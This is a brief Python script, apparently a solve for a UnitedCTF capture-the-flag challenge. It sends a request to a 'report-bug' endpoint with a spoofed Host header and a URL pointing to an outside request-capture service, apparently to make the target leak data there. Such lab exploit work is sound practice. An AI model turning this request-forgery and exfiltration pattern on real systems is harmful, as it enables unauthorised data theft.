import requests

hit_url = 'http://b29c03be656b4bdbb97e8afcb36e1f53.unitedctf.ca/'
url = 'https://requestinspector.com/inspect/01dnmxcn0w8re54tfzxcccpj73'
# url = 'requestinspector.com'
# path = '/inspect/01dnmtd2smyqpxxnkjrswks0ee'
# url= 'b29c03be656b4bdbb97e8afcb36e1f53.unitedctf.ca'
desc = 'a'
payload = 'report-bug?url={}&description={}'.format(url, desc)

header_referer_url = 'requestinspector.com'
headers = {'Host': header_referer_url}

resp = requests.get(hit_url+payload,headers=headers)
print(resp.text)